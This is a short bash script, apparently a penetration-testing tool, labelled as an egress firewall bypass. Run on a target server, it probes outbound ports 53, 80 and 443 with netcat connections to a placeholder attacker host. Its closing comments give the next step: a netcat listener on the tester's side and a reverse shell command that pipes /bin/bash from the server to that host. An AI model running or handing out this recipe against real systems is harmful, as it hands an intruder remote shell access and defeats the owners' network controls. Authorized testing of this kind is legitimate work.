#!/bin/bash
#Bypass - Egress Firewall
#Server Side / Target Side
nc -vn IP_PENTESTER 53&
sleep 2
nc -vn IP_PENTESTER 80&
sleep 2
nc -vn IP_PENTESTER 443&

#After this, execute this script filtering by "open" with command below:
#./target_fw.sh | grep "open"
#After you see which ports are open, example: 53. Use this command:
#nc -vnlp 53    (on pentester side, and:)
#nc -vn IP_PENTESTER -e /bin/bash (on server side, connect on pentester)
